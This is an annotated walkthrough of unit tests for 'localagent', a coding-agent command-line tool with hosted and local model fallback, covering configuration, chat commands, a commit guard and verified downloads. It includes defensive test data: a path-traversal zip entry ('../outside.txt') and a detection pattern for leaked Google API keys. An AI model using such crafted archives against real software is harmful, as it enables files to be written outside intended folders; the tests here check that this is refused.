524 |         self.assertTrue(any("back online" in n for n in notices))
525 | 
```
- The whole cycle with a fake clock: a name-lookup failure is not retried, the local model answers, and an "unreachable"
  notice appears; the next call skips the hosted model entirely; after the cool-down, with the probe still failing, it
  is skipped again (no request sent); when the probe succeeds the hosted model answers and "back online" is announced.

```python
526 |     def test_a_repeated_network_error_also_means_offline(self):
527 |         hosted = ScriptedBackend([LLMError("reset"), LLMError("reset")])
528 |         backend, _ = self.chain(hosted, ScriptedBackend([reply("local")]))
529 |         self.assertEqual(backend.chat([], []).message["content"], "local")
530 |         self.assertEqual(hosted.calls, 2)                           # one retry, then offline
531 | 
```
```python
532 |     def test_without_a_local_model_the_error_says_what_to_do(self):
533 |         backend, _ = self.chain(ScriptedBackend([LLMError("no name", dns=True)]))
534 |         with self.assertRaises(LLMError) as caught:
535 |             backend.chat([], [])
536 |         self.assertIn(OFFLINE_HELP, str(caught.exception))
537 | 
```
```python
538 |     def test_a_final_error_is_not_retried(self):
539 |         hosted = ScriptedBackend([LLMError("no name", dns=True)])
540 |         local = ScriptedBackend([LLMError("no local model", final=True)])
541 |         backend, _ = self.chain(hosted, local)
542 |         with self.assertRaisesRegex(LLMError, "no local model"):
543 |             backend.chat([], [])
544 |         self.assertEqual(local.calls, 1)
545 | 
546 | 
```
- Two network errors (no name failure) mean offline after one retry. Without a local model the error starts with
  `OFFLINE_HELP`. A `final` error from the local model is not retried (one call).

## Rate limiter, configuration
```python
547 | class LimiterTests(unittest.TestCase):
```
```python
548 |     def test_pacific_time_without_time_zone_data(self):
549 |         def utc(*parts):
550 |             return datetime(*parts, tzinfo=timezone.utc)
551 |         self.assertEqual(_pacific_offset(utc(2026, 3, 8, 9, 59)).total_seconds(), -8 * 3600)
552 |         self.assertEqual(_pacific_offset(utc(2026, 3, 8, 10, 0)).total_seconds(), -7 * 3600)
553 |         self.assertEqual(_pacific_offset(utc(2026, 11, 1, 8, 59)).total_seconds(), -7 * 3600)
554 |         self.assertEqual(_pacific_offset(utc(2026, 11, 1, 9, 0)).total_seconds(), -8 * 3600)
555 |         july = utc(2026, 7, 2, 6, 30).timestamp()                   # 23:30 on 1 July in California
556 |         with mock.patch.dict(sys.modules, {"zoneinfo": None}):      # as on Windows
557 |             self.assertEqual(pacific_day(july), "2026-07-01")
558 | 
```
```python
559 |     def test_one_shared_limiter_per_model_and_long_waits_are_announced(self):
560 |         with tempfile.TemporaryDirectory() as tmp:
561 |             usage = Path(tmp) / "usage.json"
562 |             first = shared_limiter("m", 5, 1000, 50, usage)
563 |             self.assertIs(shared_limiter("m", 5, 1000, 50, usage), first)
564 |             heard: list[str] = []
565 |             clock = [0.0]
566 |             limiter = RateLimiter("w", 1, 10_000, 100, usage, clock=lambda: clock[0],
567 |                                   sleep=lambda s: clock.__setitem__(0, clock[0] + s),
568 |                                   on_wait=heard.append)
569 |             limiter.before_call(10)
570 |             limiter.before_call(10)                                 # must wait about 60 s
571 |             self.assertTrue(heard and "per-minute limit" in heard[0])
572 |             self.assertEqual([p.name for p in Path(tmp).iterdir()], ["usage.json"])   # no leftovers
573 | 
574 | 
```
- The daylight-saving switches of 2026 to the minute (8 March 10:00 UTC, 1 November 09:00 UTC); and with `zoneinfo`
  made unavailable (as on Windows), 23:30 on 1 July in California is still 1 July (the old fallback said 2 July).
- The same model and limits give the same limiter object. A limiter of 1 request per minute announces the wait for
  the second request; the usage folder holds only `usage.json` afterwards (no temporary files left).

```python
575 | class ConfigTests(unittest.TestCase):
```
```python
576 |     def test_bad_values_are_explained(self):
577 |         with mock.patch.dict(os.environ, {"LOCALAGENT_NUM_CTX": "8k"}):
578 |             with self.assertRaisesRegex(ValueError, "LOCALAGENT_NUM_CTX must be a whole number"):
579 |                 Config.from_env()
580 |         with mock.patch.dict(os.environ, {"LOCALAGENT_MODE": "sometimes"}):
581 |             with self.assertRaisesRegex(ValueError, "LOCALAGENT_MODE"):
582 |                 Config.from_env()
583 |         with mock.patch.dict(os.environ, {"LOCALAGENT_MODE": "OFFLINE", "LOCALAGENT_GPU_LAYERS": "9"}):
584 |             config = Config.from_env()
585 |         self.assertEqual((config.mode, config.gpu_layers), ("offline", 9))
586 | 
587 | 
```
- `LOCALAGENT_NUM_CTX=8k` and an unknown `LOCALAGENT_MODE` raise explanations naming the variable; `OFFLINE` in capitals
  and `LOCALAGENT_GPU_LAYERS=9` are read correctly.

## The local model server
```python
588 | class LocalServerTests(unittest.TestCase):
```
```python
589 |     def test_files_are_found_where_they_are_expected(self):
590 |         with tempfile.TemporaryDirectory() as tmp:
591 |             home = Path(tmp)
592 |             (home / "models").mkdir()
593 |             (home / "models" / "mmproj-x.gguf").write_text("", encoding="utf-8")
594 |             (home / "models" / "small.gguf").write_text("", encoding="utf-8")
595 |             with mock.patch.object(localserver, "HOME", home), \
596 |                     mock.patch.object(localserver, "CHECKOUT", home / "none"):
597 |                 found = localserver.find_model_file(Config())
598 |                 self.assertEqual(found.name if found else "", "small.gguf")   # never mmproj
599 |                 self.assertIsNone(localserver.find_llama_server(replace(Config(), llama_server="")))
600 |                 given = home / "models" / "small.gguf"
601 |                 self.assertEqual(localserver.find_model_file(replace(Config(), model_file=str(given))),
602 |                                  given)
603 | 
```
```python
604 |     def test_command_line_and_where_a_server_may_be_started(self):
605 |         server = LlamaServer(Path("llama-server"), Path("m.gguf"), "http://127.0.0.1:8123/v1", 4096)
606 |         argv = server.argv()
607 |         self.assertIn("--port", argv)
608 |         self.assertEqual(argv[argv.index("--port") + 1], "8123")
609 |         self.assertNotIn("-ngl", argv)                              # llama.cpp fits the GPU
610 |         self.assertIn("-ngl", LlamaServer(Path("x"), Path("m.gguf"), "http://127.0.0.1:1/v1",
611 |                                           4096, gpu_layers=9).argv())
612 |         with mock.patch.object(localserver, "find_llama_server", return_value=Path("x")), \
613 |                 mock.patch.object(localserver, "find_model_file", return_value=Path("m.gguf")):
614 |             self.assertTrue(localserver.can_start(Config()))
615 |             self.assertFalse(localserver.can_start(replace(Config(), api_base="http://gpu-box:8000/v1")))
616 | 
```
- With `HOME` pointed at a temporary folder: the model file is found and `mmproj-*.gguf` never chosen; no server
  program means none is found; an explicit model path wins.
- The command line carries the port from the address, and `-ngl` only when GPU layers were set. A server may be
  started for `127.0.0.1` but not for a remote address.

```python
617 |     def test_a_running_server_is_used_and_the_history_fitted(self):
618 |         body = json.dumps({"choices": [{"message": {"content": "hi from local"}}]}).encode()
619 |         server = FakeServer(200, body)
620 |         self.addCleanup(server.close)
621 |         config = replace(Config(), api_base=server.url, stream=False, local_ctx=2000)
622 |         model = LocalModel(config)
623 |         history = [{"role": "system", "content": "s"}] + [
624 |             {"role": "user", "content": f"q{i} " + "w" * 3000} for i in range(4)]
625 |         self.assertEqual(model.chat(history, []).message["content"], "hi from local")
626 |         sent = server.received[-1]["messages"]
627 |         self.assertLess(len(json.dumps(sent)), len(json.dumps(history)))   # shortened to fit
628 |         self.assertTrue(model.last_model.startswith("local:"))
629 | 
```
```python
630 |     def test_nothing_local_is_a_final_error(self):
631 |         config = replace(Config(), api_base="http://127.0.0.1:9/v1", host="http://127.0.0.1:9")
632 |         with mock.patch.object(localserver, "can_start", return_value=False):
633 |             with self.assertRaises(LLMError) as caught:
634 |                 LocalModel(config).chat([], [])
635 |         self.assertTrue(caught.exception.final)
636 |         self.assertIn("No local model", str(caught.exception))
637 | 
```
- With a fake OpenAI-style server running, the local model answers through it, and a conversation four times too big
  for a 2 000-token window reaches the server shortened.
- With nothing running and nothing to start, the error is `final` and says "No local model".

```python
638 |     def test_llama_server_is_started_waited_for_and_stopped(self):
639 |         # a stopped process (or a virus scanner) may hold the log open for a moment on Windows
640 |         with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp:
641 |             script = Path(tmp) / "fake_llama.py"
642 |             script.write_text(FAKE_LLAMA, encoding="utf-8")
643 |             port = free_port()
644 |             base = f"http://127.0.0.1:{port}/v1"
645 |             server = LlamaServer(Path(sys.executable), Path(tmp) / "tiny.gguf", base, 2048)
646 |             server.argv = lambda: [sys.executable, str(script), "--port", str(port)]  # type: ignore
647 |             notices: list[str] = []
648 |             config = replace(Config(), api_base=base, host="http://127.0.0.1:9", stream=False)
649 |             with mock.patch.object(localserver, "LOG_FILE", Path(tmp) / "server.log"), \
650 |                     mock.patch.object(localserver, "can_start", return_value=True), \
651 |                     mock.patch.object(localserver, "server_for", return_value=server):
652 |                 model = LocalModel(config, on_notice=notices.append)
653 |                 try:
654 |                     self.assertEqual(model.chat([{"role": "user", "content": "hi"}], [])
655 |                                      .message["content"], "local hello")
656 |                     self.assertTrue(server.running())
657 |                     self.assertTrue(any("starting the local model" in n for n in notices))
658 |                     self.assertTrue(any("ready" in n for n in notices))
659 |                 finally:
660 |                     server.stop()
661 |             self.assertFalse(server.running())
662 | 
663 | 
```
- **The real start-up, with the fake server program:** `LocalModel` finds nothing running, starts the program (its
  command line replaced by the fake), waits through the "loading" answers until `/health` says 200, answers "local
  hello", reports "starting" and "ready", and the process is stopped afterwards. (The real `llama-server.exe` was also
  checked separately — see `localserver.md`.)

## Modes and the chat
```python
664 | class ModeTests(unittest.TestCase):
```
```python
665 |     def choose(self, mode, key="", local="", fallback=""):
666 |         found = {"openai": (True, False, False), "ollama": (False, True, False),
667 |                  "local": (False, False, True), "": (False, False, False)}[local]
668 |         with mock.patch.object(cli, "server_up", return_value=found[0]), \
669 |                 mock.patch.object(cli, "ollama_up", return_value=found[1]), \
670 |                 mock.patch.object(cli, "can_start", return_value=found[2]), \
671 |                 mock.patch.object(cli, "describe_local", return_value="a local model"):
672 |             return cli.choose_mode(replace(Config(), gemini_api_key=key, fallback_backend=fallback),
673 |                                    mode)
674 | 
```
- Runs `choose_mode` with a key or not and a chosen kind of local model (the three detection functions replaced by
  mocks, `describe_local` by a fixed text).

```python
675 |     def test_each_mode_chooses_its_models(self):
676 |         config, notes = self.choose("online", key="k", local="local")
677 |         self.assertEqual((config.backend, config.fallback_backend), ("gemini", ""))
678 |         config, notes = self.choose("auto", key="k", local="local")
679 |         self.assertEqual((config.backend, config.fallback_backend), ("gemini", "local"))
680 |         self.assertTrue(any("offline backup: a local model" in n for n in notes))
681 |         config, _ = self.choose("auto", key="k", local="ollama")
682 |         self.assertEqual(config.fallback_backend, "ollama")
683 |         config, notes = self.choose("auto", local="openai")
684 |         self.assertEqual((config.backend, config.num_ctx), ("local", 8192))
685 |         self.assertIn("no GEMINI_API_KEY", notes[0])
686 |         config, _ = self.choose("offline", key="k", local="local")
687 |         self.assertEqual((config.backend, config.mode), ("local", "offline"))
688 | 
```
```python
689 |     def test_impossible_modes_say_what_to_do(self):
690 |         with self.assertRaisesRegex(ValueError, "online mode needs a Gemini key"):
691 |             self.choose("online")
692 |         with self.assertRaisesRegex(ValueError, "No local model"):
693 |             self.choose("offline", key="k")
694 |         with self.assertRaisesRegex(ValueError, "No model is available yet"):
695 |             self.choose("auto")
696 |         with self.assertRaisesRegex(ValueError, "unknown mode"):
697 |             self.choose("sometimes", key="k")
698 | 
```
- Online: Gemini, no backup. Auto with a key: Gemini plus the local backup (or Ollama). Auto without a key: the local
  model with an 8K budget and a note saying why. Offline: the local model even with a key.
- Online without a key, offline without a local model, auto with nothing, and an unknown mode each raise an
  explanation.

```python
699 |     def test_backends_for_the_modes(self):
700 |         self.assertIsInstance(make_backend(replace(Config(), backend="local")), LocalModel)
701 |         chain = make_gemini(replace(Config(), gemini_api_key="k", gemini_models=("m1",),
702 |                                     gemini_strong_models=(), fallback_backend="local"))
703 |         last = chain._entries[-1]
704 |         self.assertEqual(last.name, "local")
705 |         self.assertIsInstance(last.backend, LocalModel)
706 |         self.assertIsNotNone(chain._probe)
707 |         with mock.patch.object(cli, "find_model_file", return_value=Path("Qwen3-8B.gguf")):
708 |             self.assertEqual(cli.model_label(replace(Config(), backend="local")), "local:Qwen3-8B")
709 |             self.assertTrue(cli.model_label(replace(Config(), backend="gemini", gemini_models=("m",),
710 |                             gemini_strong_models=(), fallback_backend="local")).endswith("> local:Qwen3-8B"))
711 | 
```
```python
712 |     def test_flags(self):
713 |         parser = cli.build_parser()
714 |         self.assertEqual(parser.parse_args(["--offline"]).mode, "offline")
715 |         self.assertEqual(parser.parse_args(["--online"]).mode, "online")
716 |         self.assertEqual(parser.parse_args(["--mode", "auto"]).mode, "auto")
717 |         self.assertEqual(parser.parse_args(["-p", "hi"]).prompt, "hi")
718 |         self.assertTrue(parser.parse_args(["-c"]).resume)
719 |         with contextlib.redirect_stdout(io.StringIO()) as out, self.assertRaises(SystemExit):
720 |             parser.parse_args(["--version"])
721 |         self.assertIn("localagent 0.", out.getvalue())
722 | 
723 | 
```
- `local` builds a `LocalModel`; a Gemini chain with a `local` fallback ends with a `LocalModel` and has a probe; labels
  name the local model by its file.
- `--offline`, `--online`, `--mode`, `-p` and `-c` set what they should; `--version` prints the version.

```python
724 | class ChatTests(unittest.TestCase):
```
```python
725 |     def chat(self, tmp, script, **kw):
726 |         cfg = replace(Config(), workspace=Path(tmp), auto_format=False, **kw)
727 |         tools = ToolBox(cfg, lambda _q: True, {"permissions": {"allow": ["run_tests"], "deny": []}})
728 |         args = cli.build_parser().parse_args([])
729 |         with contextlib.redirect_stdout(io.StringIO()):
730 |             return cli.Chat(cfg, args, FakeBackend(script), tools, Meter())
731 | 
```
```python
732 |     def say(self, chat, text) -> str:
733 |         with contextlib.redirect_stdout(io.StringIO()) as out:
734 |             self.assertTrue(chat.command(text))
735 |         return out.getvalue()
736 | 
```
- `chat` builds a `Chat` with a scripted model (and `run_tests` allowed); `say` types one line and returns what was
  printed.

```python
737 |     def test_bang_runs_a_command_and_its_output_goes_with_the_next_request(self):
738 |         with tempfile.TemporaryDirectory() as tmp:
739 |             chat = self.chat(tmp, [{"role": "assistant", "content": "seen"}])
740 |             self.assertIn("hello-from-shell", self.say(chat, "!echo hello-from-shell"))
741 |             self.assertEqual(chat.meter.calls, 0)                   # no model call
742 |             self.say(chat, "what did it print?")
743 |             sent = [m["content"] for m in chat.agent.messages if m["role"] == "user"][-1]
744 |             self.assertIn("hello-from-shell", sent)
745 |             self.assertIn("My request: what did it print?", sent)
746 | 
```
```python
747 |     def test_hash_saves_a_note_and_at_attaches_a_file(self):
748 |         with tempfile.TemporaryDirectory() as tmp:
749 |             (Path(tmp) / "AGENT.md").write_text("# Notes for agents\n\n## Notes\n- old\n\n## Other\nx\n",
750 |                                                 encoding="utf-8")
751 |             (Path(tmp) / "app.py").write_text("print('APP')\n", encoding="utf-8")
752 |             chat = self.chat(tmp, [{"role": "assistant", "content": "ok"}])
753 |             self.say(chat, "# always use type hints")
754 |             notes = (Path(tmp) / "AGENT.md").read_text(encoding="utf-8")
755 |             self.assertIn("- old\n- always use type hints\n\n## Other", notes)
756 |             self.assertIn("always use type hints", chat.agent.messages[0]["content"])   # reloaded
757 |             self.assertIn("[attached: app.py]", self.say(chat, "explain @app.py, mail me@example.com"))
758 |             self.assertIn("print('APP')", chat.agent.messages[-2]["content"])
759 | 
```
```python
760 |     def test_attachments_respect_the_size_limit(self):
761 |         with tempfile.TemporaryDirectory() as tmp:
762 |             (Path(tmp) / "big.txt").write_text("b" * 500, encoding="utf-8")
763 |             text, attached = cli.attach_files("see @big.txt and @missing.py", Path(tmp), 100)
764 |             self.assertEqual((text, attached), ("see @big.txt and @missing.py", []))
765 |             text, attached = cli.attach_files("see @big.txt.", Path(tmp), 1000)
766 |             self.assertEqual(attached, ["big.txt"])
767 | 
```
- `!echo hello-from-shell` prints the output with no model call; the next request carries it, followed by "My
  request: ...".
- `# always use type hints` lands under `## Notes`, before the next section, and is in the system prompt at once.
  `@app.py` attaches the file (and `me@example.com` is ignored).
- A file bigger than the limit, and a missing file, are not attached; trailing punctuation after `@big.txt.` is ignored.

```python
768 |     def test_model_status_and_switching(self):
769 |         with tempfile.TemporaryDirectory() as tmp:
770 |             chat = self.chat(tmp, [])
771 |             with mock.patch.object(cli, "describe_local", return_value="LOCAL THING"):
772 |                 status = self.say(chat, "/model")
773 |             self.assertIn("mode: auto", status)
774 |             self.assertIn("offline: LOCAL THING", status)
775 |             offline = replace(chat.config, backend="local", mode="offline", num_ctx=8192)
776 |             new_backend = FakeBackend([])
777 |             with mock.patch.object(cli, "choose_mode", return_value=(offline, ["note"])), \
778 |                     mock.patch.object(cli, "make_backend", return_value=new_backend):
779 |                 said = self.say(chat, "/offline")
780 |             self.assertIn("[now offline", said)
781 |             self.assertIs(chat.agent.backend, new_backend)
782 |             self.assertEqual(chat.config.mode, "offline")
783 |             with mock.patch.object(cli, "choose_mode", side_effect=ValueError("no key")):
784 |                 self.assertIn("cannot switch to online: no key", self.say(chat, "/model online"))
785 |             self.assertIs(chat.agent.backend, new_backend)          # unchanged after a failure
786 | 
```
```python
787 |     def test_clear_resume_permissions_and_unknown_commands(self):
788 |         with tempfile.TemporaryDirectory() as tmp:
789 |             chat = self.chat(tmp, [{"role": "assistant", "content": "a"}])
790 |             self.say(chat, "remember the blue door")
791 |             self.assertIn("conversation cleared", self.say(chat, "/clear"))
792 |             self.assertEqual(len(chat.agent.messages), 1)
793 |             listing = self.say(chat, "/resume")
794 |             self.assertIn("remember the blue door", listing)
795 |             self.assertIn("(this conversation)", listing)
796 |             self.assertIn("allow: run_tests", self.say(chat, "/permissions"))
797 |             self.assertIn("unknown command /nope", self.say(chat, "/nope"))
798 |             with contextlib.redirect_stdout(io.StringIO()):
799 |                 self.assertFalse(chat.command("/exit"))
800 | 
```
- `/model` shows the mode and the offline model. `/offline` (with the mode choice and backend mocked) switches the agent
  to the new backend and mode. A failing switch (`no key`) is reported and changes nothing.
- `/clear` empties the conversation; `/resume` lists it (marked as this conversation); `/permissions` shows the rules;
  an unknown command says so; `/exit` quits.

```python
801 |     def test_print_mode_answers_once(self):
802 |         with tempfile.TemporaryDirectory() as tmp:
803 |             cfg = replace(Config(), workspace=Path(tmp))
804 |             tools = ToolBox(cfg, cli.refuse)
805 |             script = [tool_call("run_tests"), {"role": "assistant", "content": "the answer"}]
806 |             with contextlib.redirect_stdout(io.StringIO()) as out, \
807 |                     contextlib.redirect_stderr(io.StringIO()) as err:
808 |                 code = cli.run_once(cfg, FakeBackend(script), tools, Meter(), "question")
809 |             self.assertEqual((code, out.getvalue().strip()), (0, "the answer"))
810 |             self.assertIn("refused", err.getvalue())                # nobody to ask: refused
811 | 
```
```python
812 |     def test_prompts_without_a_keyboard_mean_no(self):
813 |         def gone(_prompt):
814 |             raise EOFError
815 |         self.assertFalse(cli.Approver(read=gone)("run x"))
816 |         with contextlib.redirect_stdout(io.StringIO()):
817 |             self.assertFalse(cli.confirm("go? ", read=gone))
818 | 
```
```python
819 |     def test_colours_only_where_wanted(self):
820 |         with contextlib.redirect_stdout(io.StringIO()) as out:
821 |             cli.make_printer(True)("     +added")
822 |             cli.make_printer(False)("     -removed")
823 |         self.assertEqual(out.getvalue(), "\033[32m     +added\033[0m\n     -removed\n")
824 |         with mock.patch.dict(os.environ, {"NO_COLOR": "1"}):
825 |             self.assertFalse(cli.use_color())
826 | 
```
```python
827 |     def test_overview_summarises_crowded_folders(self):
828 |         with tempfile.TemporaryDirectory() as tmp:
829 |             root = Path(tmp)
830 |             for i in range(30):
831 |                 (root / "bin").mkdir(exist_ok=True)
832 |                 (root / "bin" / f"lib{i}.dll").write_bytes(b"x")
833 |             (root / "src").mkdir()
834 |             for name in ("main.py", "util.py"):
835 |                 (root / "src" / name).write_text("x", encoding="utf-8")
836 |             (root / "README.md").write_text("x", encoding="utf-8")
837 |             tree = project_tree(root, 6).splitlines()
838 |             self.assertEqual(tree, ["README.md", "bin/ (30 files: 30 .dll)", "src/main.py",
839 |                                     "src/util.py"])
840 | 
841 | 
```
- `-p`: the answer alone on standard output, exit code 0, and a `run_tests` the model asked for is refused (nobody to ask).
- An approval or a confirmation with no input means no.
- With colours an added diff line is green; without, plain; `NO_COLOR` switches colours off.
- 30 DLLs, two source files and a README in 6 lines: the README, one summary line for `bin/`, both source files.

## The commit guard
```python
842 | class CommitGuardTests(unittest.TestCase):
```
```python
843 |     def test_problems_in_staged_files(self):
844 |         key = b"AIza" + b"x" * 35                                   # built here: never in the source
845 |         self.assertEqual(check_commit.problems("ok.py", 10, lambda: b"print(1)"), [])
846 |         self.assertIn("Google API key", check_commit.problems("cfg.py", 50, lambda: key)[0])
847 |         self.assertIn("must never be committed", check_commit.problems(".env", 5, lambda: b"")[0])
848 |         self.assertEqual(check_commit.problems(".env.example", 5, lambda: b"KEY="), [])
849 |         big = check_commit.problems("models/m.gguf", 5_000_000_000, lambda: b"")
850 |         self.assertEqual(len(big), 2)                               # a model file, and too big
851 |         self.assertIn("too big", big[1])
852 | 
```
```python
853 |     def test_only_a_private_author_address_passes(self):
854 |         self.assertIsNone(check_commit.author_problem(
855 |             "A <1+a@users.noreply.github.com> 1700000000 +0000"))
856 |         self.assertIn("would be public", check_commit.author_problem("A <a@gmail.com> 1 +0000"))
857 | 
858 | 
```
- A clean file passes; a fake Google key (built at run time) is found; `.env` is refused but `.env.example` is fine; a
  5 GB model file gets two problems (its kind and its size) without being read.
- A noreply author passes; a Gmail author gets the explanation.

```python
859 | if __name__ == "__main__":
860 |     unittest.main()
```
- Lets you run the file directly.

---
# `tests/test_product.py` — the product commands

**Role:** proves the parts that turn the agent into a downloadable product — verified and resumable downloads, safe
unpacking, the model catalog, `localagent setup` and `localagent models` — without downloading anything real: a small
local file server plays GitHub and Hugging Face. 15 tests, about 3 seconds.

## Helpers
```python
  1 | """Tests for the product commands: verified, resumable downloads, safe unpacking, the model
  2 | catalog and `localagent setup` / `localagent models` (no real download, no model needed)."""
  3 | import contextlib
  4 | import hashlib
  5 | import io
  6 | import json
  7 | import os
  8 | import tarfile
  9 | import tempfile
 10 | import threading
 11 | import unittest
 12 | import zipfile
 13 | from dataclasses import replace
 14 | from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 15 | from pathlib import Path
 16 | from unittest import mock
 17 | 
 18 | from localagent import cli, models
 19 | from localagent.config import Config
 20 | from localagent.fetch import DownloadError, download, extract_archive
 21 | from localagent.settings import save_user_env
 22 | 
 23 | DATA = bytes(range(256)) * 4096                  # 1 MB of test content
 24 | DATA_SHA = hashlib.sha256(DATA).hexdigest()
 25 | 
 26 | 
```
- `DATA` is 1 MB of test content and `DATA_SHA` its checksum, standing in for a model file.

```python
 27 | class RangeServer:
 28 |     """A file server that understands Range requests (or ignores them), and can stop early."""
 29 | 
```
```python
 30 |     def __init__(self, data: bytes, honour_range: bool = True, cut_at: int | None = None) -> None:
 31 |         outer = self
 32 |         self.ranges: list[str | None] = []
 33 | 
 34 |         class Handler(BaseHTTPRequestHandler):
 35 |             def do_GET(self):  # noqa: N802 (name fixed by http.server)
 36 |                 asked = self.headers.get("Range")
 37 |                 outer.ranges.append(asked)
 38 |                 body, status = data, 200
 39 |                 if asked and honour_range:
 40 |                     body, status = data[int(asked.split("=")[1].split("-")[0]):], 206
 41 |                 if cut_at is not None:
 42 |                     body = body[:cut_at]                 # the connection "breaks" early
 43 |                 self.send_response(status)
 44 |                 self.send_header("Content-Length", str(len(body)))
 45 |                 self.end_headers()
 46 |                 self.wfile.write(body)
 47 | 
 48 |             def log_message(self, *args):
 49 |                 pass
 50 | 
 51 |         self._server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
 52 |         self.url = f"http://127.0.0.1:{self._server.server_port}/file.bin"
 53 |         threading.Thread(target=self._server.serve_forever, daemon=True).start()
 54 | 
```
```python
 55 |     def close(self) -> None:
 56 |         self._server.shutdown()
 57 |         self._server.server_close()
 58 | 
 59 | 
```
- A file server on a free local port that records every `Range` header it receives, answers a Range request with `206`
  and the rest of the file (or, with `honour_range=False`, ignores it and sends everything with `200`), and with
  `cut_at` sends only that many bytes — a connection that "breaks".

## Downloads
```python
 60 | class DownloadTests(unittest.TestCase):
```
```python
 61 |     def serve(self, **kw) -> RangeServer:
 62 |         server = RangeServer(DATA, **kw)
 63 |         self.addCleanup(server.close)
 64 |         return server
 65 | 
```
```python
 66 |     def test_a_download_is_verified_and_kept_once(self):
 67 |         server = self.serve()
 68 |         with tempfile.TemporaryDirectory() as tmp:
 69 |             target = Path(tmp) / "m.gguf"
 70 |             seen: list[int] = []
 71 |             download(server.url, target, DATA_SHA, len(DATA), lambda done, _total: seen.append(done))
 72 |             self.assertEqual(target.read_bytes(), DATA)
 73 |             self.assertEqual(seen[-1], len(DATA))
 74 |             download(server.url, target, DATA_SHA, len(DATA))
 75 |             self.assertEqual(len(server.ranges), 1)                # already there: no second fetch
 76 | 
```
```python
 77 |     def test_a_wrong_checksum_deletes_the_file(self):
 78 |         server = self.serve()
 79 |         with tempfile.TemporaryDirectory() as tmp:
 80 |             target = Path(tmp) / "m.gguf"
 81 |             with self.assertRaisesRegex(DownloadError, "does not match its published checksum"):
 82 |                 download(server.url, target, "0" * 64, len(DATA))
 83 |             self.assertEqual(list(Path(tmp).iterdir()), [])
 84 | 
```
- A download arrives complete and reports progress up to its size; asking again sends no second request.
- With a wrong checksum the download fails and nothing is left in the folder — not even the part.

```python
 85 |     def test_an_interrupted_download_continues_where_it_stopped(self):
 86 |         with tempfile.TemporaryDirectory() as tmp:
 87 |             target = Path(tmp) / "m.gguf"
 88 |             broken = self.serve(cut_at=300_000)
 89 |             with self.assertRaisesRegex(DownloadError, "run the same command again"):
 90 |                 download(broken.url, target, DATA_SHA, len(DATA))
 91 |             self.assertEqual(target.with_name("m.gguf.part").stat().st_size, 300_000)
 92 |             good = self.serve()
 93 |             download(good.url, target, DATA_SHA, len(DATA))
 94 |             self.assertEqual(good.ranges, ["bytes=300000-"])        # only the rest was asked for
 95 |             self.assertEqual(target.read_bytes(), DATA)
 96 | 
```
```python
 97 |     def test_a_server_ignoring_the_range_sends_everything_again(self):
 98 |         with tempfile.TemporaryDirectory() as tmp:
 99 |             target = Path(tmp) / "m.gguf"
100 |             target.with_name("m.gguf.part").write_bytes(DATA[:1000])
101 |             download(self.serve(honour_range=False).url, target, DATA_SHA, len(DATA))
102 |             self.assertEqual(target.read_bytes(), DATA)
103 | 
```
- A connection that breaks after 300 000 bytes leaves exactly that part and the advice to run again; the next run asks
  only for `bytes=300000-` and ends with the complete, verified file.
- A server that ignores the Range request still ends with the right file (the part is started again).

```python
104 |     def test_archives_are_unpacked_only_inside_their_folder(self):
105 |         with tempfile.TemporaryDirectory() as tmp:
106 |             root = Path(tmp)
107 |             good, evil = root / "good.zip", root / "evil.zip"
108 |             with zipfile.ZipFile(good, "w") as bundle:
109 |                 bundle.writestr("build/llama-server.exe", b"MZ")
110 |             with zipfile.ZipFile(evil, "w") as bundle:
111 |                 bundle.writestr("../outside.txt", b"x")
112 |             extract_archive(good, root / "out")
113 |             self.assertTrue((root / "out" / "build" / "llama-server.exe").is_file())
114 |             with self.assertRaisesRegex(DownloadError, "would land outside"):
115 |                 extract_archive(evil, root / "out2")
116 |             self.assertFalse((root / "outside.txt").exists())
117 |             tgz = root / "build.tar.gz"
118 |             with tarfile.open(tgz, "w:gz") as bundle:
119 |                 info = tarfile.TarInfo("bin/llama-server")
120 |                 info.size = 2
121 |                 bundle.addfile(info, io.BytesIO(b"\x7fE"))
122 |             extract_archive(tgz, root / "out3")
123 |             self.assertTrue((root / "out3" / "bin" / "llama-server").is_file())
124 | 
125 | 
```
- A normal zip unpacks; a zip with `../outside.txt` is refused and writes nothing outside; a `.tar.gz` (the Linux and
  macOS format) unpacks too.

## Catalog and llama.cpp
```python
126 | class CatalogTests(unittest.TestCase):
```
```python
127 |     def test_the_suggestion_follows_the_memory(self):
128 |         self.assertEqual(models.recommend(15.7).name, "qwen3-8b")
129 |         self.assertEqual(models.recommend(7.8).name, "qwen3-4b")
130 |         self.assertEqual(models.recommend(4.0).name, "qwen3-1.7b")
131 |         self.assertEqual(models.recommend(None).name, "qwen3-4b")
132 |         self.assertEqual(models.catalog_entry(" QWEN3-4B ").file, "Qwen3-4B-Q4_K_M.gguf")
133 |         self.assertIsNone(models.catalog_entry("gpt-9"))
134 |         memory = models.total_memory_gb()
135 |         self.assertTrue(memory is None or memory > 0.5)
136 |         self.assertTrue(all(len(m.sha256) == 64 and m.url.endswith(m.file) for m in models.CATALOG))
137 | 
```
- 15.7 GB → the 8B model, 7.8 GB → 4B, 4 GB → 1.7B, unknown → 4B; names match in any case; this computer's memory is
  read; every catalog entry has a 64-character checksum and a matching address.

```python
138 |     def test_the_newest_llama_build_with_a_checksum_is_chosen(self):
139 |         def asset(tag, variant, digest="sha256:" + "a" * 64):
140 |             name = f"llama-{tag}-bin-{variant}.zip"
141 |             return {"name": name, "size": 10, "browser_download_url": f"https://x/{name}", "digest": digest}
142 |         releases = [{"tag_name": "v1.0.0", "assets": [{"name": "nightly-tag.txt"}]},     # placeholder
143 |                     {"tag_name": "b2", "assets": [asset("b2", "win-vulkan-x64", digest="")]},
144 |                     {"tag_name": "b1", "assets": [asset("b1", "win-cpu-x64"), asset("b1", "win-vulkan-x64")]}]
145 |         with mock.patch.object(models, "get_json", return_value=releases):
146 |             name, url, size, sha = models.find_llama_release(("win-vulkan-x64", "win-cpu-x64"))
147 |             self.assertEqual((name, sha), ("llama-b1-bin-win-vulkan-x64.zip", "a" * 64))
148 |             with self.assertRaisesRegex(DownloadError, "no llama.cpp build"):
149 |                 models.find_llama_release(("macos-arm64",))
150 | 
```
- Three releases: a placeholder like llama.cpp's real `v1.0.0`, one whose file has no checksum, and one with both
  builds. The Vulkan build of the third is chosen; a platform no release has gives a clear error.

```python
151 |     def test_llama_cpp_is_installed_from_a_verified_archive(self):
152 |         payload = io.BytesIO()
153 |         with zipfile.ZipFile(payload, "w") as bundle:
